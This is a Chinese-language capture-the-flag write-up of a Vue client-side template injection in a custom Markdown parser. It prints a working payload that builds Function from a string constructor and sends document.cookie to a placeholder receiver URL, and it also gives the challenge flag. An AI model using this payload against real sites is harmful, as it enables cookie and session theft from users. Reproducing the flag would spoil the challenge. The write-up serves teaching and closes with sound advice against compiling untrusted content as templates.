# Markdown Parser 2

## 题目简述

页面从 URL 的 `markdown` 参数读取用户内容，自制解析器虽会转义普通 HTML，却把解析结果直接作为 Vue 应用的 `template`。管理员机器人携带可读的 flag cookie 访问反馈链接。目标是利用 Vue 客户端模板注入执行 JavaScript 并外带 cookie。

## 解题过程

决定性代码为：

```javascript
const params = new URLSearchParams(window.location.search);
this.markdownHtml = params.get("markdown");

const App = {
    template: `${parseMarkdown(this.markdownHtml)}`
};
Vue.createApp(App).mount("#app");
```

HTML 转义不能阻止 Vue 模板表达式 `{{ ... }}`。利用字符串构造器取得 `Function`，执行请求外带 `document.cookie`：

```text
{{''.constructor.constructor("fetch('<RECEIVER_URL>?c='+encodeURIComponent(document.cookie))")()}}
```

先把 `<RECEIVER_URL>` 替换为自己控制的 HTTPS 请求接收端，再将整段内容作为 Markdown 生成页面 URL，最后点击 Send Feedback。后端只允许同主机 URL，但会重建本地 `/parse-markdown?...` 地址并交给管理员浏览器；管理员 cookie 名为 `flag` 且 `httpOnly: false`。接收端收到：

```text
grey{l00ks_l1k3_y0u_c4n_Vue_fl4g}
```

## 方法总结

文本经过 HTML 转义，不代表可安全进入前端框架模板。只要不可信内容被当作 Vue `template` 编译，模板表达式就会获得执行能力。安全做法是把用户内容作为纯文本或预渲染节点插入，绝不能动态编译为模板。
